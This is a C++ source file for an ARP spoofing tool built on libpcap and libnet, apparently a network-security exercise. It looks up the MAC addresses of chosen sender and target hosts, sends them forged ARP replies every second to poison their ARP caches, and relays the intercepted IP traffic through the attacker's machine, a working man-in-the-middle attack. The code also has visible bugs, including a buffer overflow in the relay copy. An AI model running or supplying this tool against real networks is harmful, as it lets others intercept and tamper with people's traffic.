#include <cstdio>
#include <unistd.h>
#include <vector>
#include <thread>
#include <pcap.h>
#include <sys/ioctl.h>
#include <libnet.h>
#include <net/if.h>
#include <netinet/ether.h>
#include "ethhdr.h"
#include "arphdr.h"

using namespace std;

#pragma pack(push, 1)

struct EthArpPacket 
{
	EthHdr eth_;
	ArpHdr arp_;
};

struct packet_hdr
{
	struct libnet_ethernet_hdr eth;
    struct libnet_ipv4_hdr ip;
    struct libnet_tcp_hdr tcp;
};

struct Session
{
	char* sender_ip;
	char* target_ip;
	char sender_mac[20] = {0,};
	char target_mac[20] = {0,};
};

#pragma pack(pop)

void usage() 
{
	printf("syntax: arp-spoof <interface> <sender_ip> <target_ip>\n");
	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

int get_my_ip(char* dev, char* myip)
{
	int sock;
	struct ifreq ifr;
 
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
 	
 	if(sock < 0)
 	{
 		printf("[!] get_my_ip socket error\n");
 		return -1;
 	}

    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) 
    {
        printf("[!] get_my_ip error\n");
        close(sock);
        return -1;
    } 
    else 
    {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, myip, sizeof(struct sockaddr));
        close(sock);
        return 0;
    }

}

void convrt_mac(const char* data, char* cvrt_str, int sz)
{

     char buf[128] = {0,};
     char t_buf[8];
     char *stp = strtok((char *)data , ":");
     int temp=0;

     do
     {
          memset(t_buf, 0, sizeof(t_buf));
          sscanf(stp, "%x", &temp );
          snprintf(t_buf, sizeof(t_buf)-1, "%02X", temp);
          strncat(buf, t_buf, sizeof(buf)-1);
          strncat(buf, ":", sizeof(buf)-1);
     } while((stp = strtok(NULL , ":")) != NULL);

     buf[strlen(buf) - 1] = '\0';
     strncpy(cvrt_str, buf, sz);
}

int get_my_mac(char* dev, char* mymac)
{
	int sock;
	struct ifreq ifr;
	char mac_adr[18] = {0,};

	sock = socket(AF_INET, SOCK_STREAM, 0);
	strncpy(ifr.ifr_name, dev, IFNAMSIZ);

	if(sock < 0)
 	{
 		printf("[!] get_my_mac socket error\n");
 		return -1;
 	}

	if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0)    
	{
        printf("[!] get_my_mac error\n");
        close(sock);
        return -1;
	}

	convrt_mac(ether_ntoa((struct ether_addr *)(ifr.ifr_hwaddr.sa_data)), mac_adr, sizeof(mac_adr) -1 );
	strncpy(mymac, mac_adr, 18);

	close(sock);
	return 0;
}

int send_arp(char* dev, char* smac, char* sip, char* tmac, char* tip, int op)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) 
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;
	packet.eth_.smac_ = Mac(smac);
	packet.eth_.dmac_ = Mac(tmac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(op);
	packet.arp_.smac_ = Mac(smac);
	packet.arp_.sip_ = htonl(Ip(sip));
	if(op == ARPOP_REQUEST)
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	else
		packet.arp_.tmac_ = Mac(tmac);
	packet.arp_.tip_ = htonl(Ip(tip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if(res != 0) 
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);


}

void attack_senders(char* dev, vector<Session> session_arr, char* mymac, char* myip)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) 
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return;
	}

	while(1)
	{
		for(vector<Session>::iterator it = session_arr.begin(); it != session_arr.end(); it++)
		{
			send_arp(dev, mymac, it->target_ip, it->sender_mac, it->sender_ip, ARPOP_REPLY);
		}
		sleep(1);
	}
}


int is_src_infected(vector<Session> s, char* smac)
{
	for(vector<Session>::iterator it = s.begin(); it != s.end(); it++)
	{
		printf("%s : %s\n", it->sender_mac, smac);
		if(!strcmp(it->sender_mac, smac)) return 1;
	}

	return 0;
}

Session get_src_session(vector<Session> s, char* smac)
{
	for(vector<Session>::iterator it = s.begin(); it != s.end(); it++)
	{
		if(!strcmp(it->sender_mac, smac))
			return *it;
	}
}

void relay_packets(char* dev, vector<Session> session_arr, char* mymac, char* myip)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) 
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return;
	}

	while(1)
	{
		struct pcap_pkthdr* header;
		const u_char* pkt;
		int res = pcap_next_ex(handle, &header, &pkt);

		if (res == 0) continue;
		if(res == -1 || res == -2) break;
		
		struct libnet_ethernet_hdr *eth_hdr = (struct libnet_ethernet_hdr*) pkt;

		if(ntohs(eth_hdr->ether_type) != ETHERTYPE_IP)
			continue;

		uint8_t orig_smac[6], orig_dmac[6];
		memcpy(orig_smac, eth_hdr->ether_shost, sizeof(orig_smac));
		memcpy(orig_dmac, eth_hdr->ether_dhost, sizeof(orig_dmac));

		char smac_str[20];
		sprintf(&smac_str[0*3], "%02x:", orig_smac[0]);
    	for(int i=1; i<5; i++)
			sprintf(&smac_str[i*3], "%02X:", orig_smac[i]);

		sprintf(&smac_str[5*3], "%02X", orig_smac[5]);

		if(!is_src_infected(session_arr, smac_str))
			continue;

		struct Session session = get_src_session(session_arr, smac_str);

		Mac smac = Mac(mymac);
		Mac dmac = Mac(session.target_mac);

		for(int i = 0 ; i < 6 ; i++)
		{
			eth_hdr->ether_shost[i] = (uint8_t)smac.mac_[i];
			eth_hdr->ether_dhost[i] = (uint8_t)dmac.mac_[i];
		}

		u_char* relay_packet = (u_char*)malloc(header->caplen);
		memcpy(relay_packet, pkt, header->caplen+4);
		memcpy(relay_packet, eth_hdr, LIBNET_ETH_H);

		int res2 = pcap_sendpacket(handle, relay_packet, header->caplen+4);
		
	}
}

int main(int argc, char* argv[])
{
	if ( (argc%2) != 0 ) 
	{
		usage();
		return -1;
	}

	char* dev = argv[1];
	char myip[20] = {0,};
	char mymac[20] = {0,};

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == nullptr) 
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	// create session array
	vector<Session> session_array;
	for(int i = 2; i < argc; i += 2)
	{
		Session new_session;
		new_session.sender_ip = argv[i];
		new_session.target_ip = argv[i+1];
		session_array.push_back(new_session);
	}

	// get my ip & my mac
	get_my_ip(dev, myip);
	get_my_mac(dev, mymac);
	printf("[*] my ip & my mac\n");
	printf("myip : %s\n", myip);
	printf("mymac : %s\n", mymac);

	// collect session mac
	for(vector<Session>::iterator it = session_array.begin(); it != session_array.end(); it++)
	{
		char* sip;
		char* tip;

		sip = it->sender_ip;
		tip = it->target_ip;

		// arp request (which mac has sender ip?)
		send_arp(dev, mymac, myip, "ff:ff:ff:ff:ff:ff", sip, ARPOP_REQUEST);

		// get response
		struct pcap_pkthdr* header1;
		const u_char* pkt1;
		while(1)
		{
			int r = pcap_next_ex(handle, &header1, &pkt1);
			struct EthArpPacket* packet1 = (struct EthArpPacket*)pkt1;
			if(ntohs(packet1->eth_.type_ == htons(EthHdr::Arp)) && !strcmp(std::string(packet1->eth_.dmac_).c_str(), mymac)) break;
		}
		struct EthArpPacket* packet1 = (struct EthArpPacket*)pkt1;
		Mac mac1 = packet1->arp_.smac_;
		strcpy(it->sender_mac, std::string(mac1).c_str());

		// arp request (which mac has target ip?)
		send_arp(dev, mymac, myip, "ff:ff:ff:ff:ff:ff", tip, ARPOP_REQUEST);

		// get response
		struct pcap_pkthdr* header2;
		const u_char* pkt2;
		while(1)
		{
			int r = pcap_next_ex(handle, &header2, &pkt2);
			struct EthArpPacket* packet2 = (struct EthArpPacket*)pkt2;
			if(ntohs(packet2->eth_.type_ == htons(EthHdr::Arp)) && !strcmp(std::string(packet2->eth_.dmac_).c_str(), mymac)) break;
		}
		struct EthArpPacket* packet2 = (struct EthArpPacket*)pkt2;
		Mac mac2 = packet2->arp_.smac_;
		strcpy(it->target_mac, std::string(mac2).c_str());
	}

	int i = 0;
	// show sessions
	for(vector<Session>::iterator it = session_array.begin(); it != session_array.end(); it++)
	{
		printf("[*] Session List\n");
		printf("<%d>\n", i);
		printf("\t- sender : %s - %s\n", it->sender_ip, it->sender_mac);
		printf("\t- target : %s - %s\n", it->target_ip, it->target_mac);
	}


	// attack sender's arp-table
	thread attack_thread(attack_senders, dev, session_array, mymac, myip);
	attack_thread.detach();

	// relay packets
	thread relay_thread(relay_packets, dev, session_array, mymac, myip);
	relay_thread.detach();

	while(1)
	{

	}
}